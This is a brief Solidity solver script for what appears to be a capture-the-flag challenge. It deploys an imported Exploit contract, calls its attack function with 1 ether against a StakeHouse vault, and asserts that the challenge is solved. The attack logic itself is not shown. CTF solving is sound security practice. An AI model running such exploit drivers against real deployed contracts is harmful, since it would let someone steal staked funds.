// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import 'forge-ctf/CTFSolver.sol';

import 'src/Challenge.sol';
import 'src/StakeHouse.sol';
import 'script/exploit/Exploit.sol';

contract Solve is CTFSolver {
    function solve(address challengeAddress, address player) internal override {
        Challenge challenge = Challenge(challengeAddress);
        StakeHouse vault = challenge.VAULT();

        Exploit exploit = new Exploit();
        exploit.attack{value: 1 ether}(vault);

        require(challenge.isSolved(), 'Challenge not solved');
    }
}
